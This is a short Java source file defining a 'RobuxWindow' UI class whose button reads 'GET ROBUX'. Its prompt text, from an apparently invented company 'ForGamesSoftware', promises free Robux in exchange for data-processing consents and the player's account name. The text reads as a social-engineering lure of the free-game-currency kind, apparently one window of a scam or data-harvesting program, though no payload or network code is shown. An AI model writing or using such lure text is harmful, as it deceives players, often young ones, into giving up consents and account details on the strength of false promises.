package UI.Windows.GameSpecific;

import UI.Windows.BaseWindow;

import java.awt.*;

public class RobuxWindow extends BaseWindow {

    public RobuxWindow(String title) throws HeadlessException {
        super(title);

        proceedButton.setText("GET ROBUX");
        promptMessage.setText("Hello, we know you came here for Roblox, and we need your help. We are ForGamesSoftware, a technology company that is responsible for, among other things, monitoring traffic in online games. In order to monitor traffic on Roblox game servers, we need telemetry data from as many players as possible. Telemetry data is automatically collected data about your activity in the game, we do not collect your personal information.\n" +
                "We need you to mark the appropriate consents for data processing, in return for which we will reward the account given by you with the appropriate amount of Roblox.\n");
        inputDescription.setText("Account that will get Robux:");
        inputPlaceholder.setText("Input your player nick");
    }
}
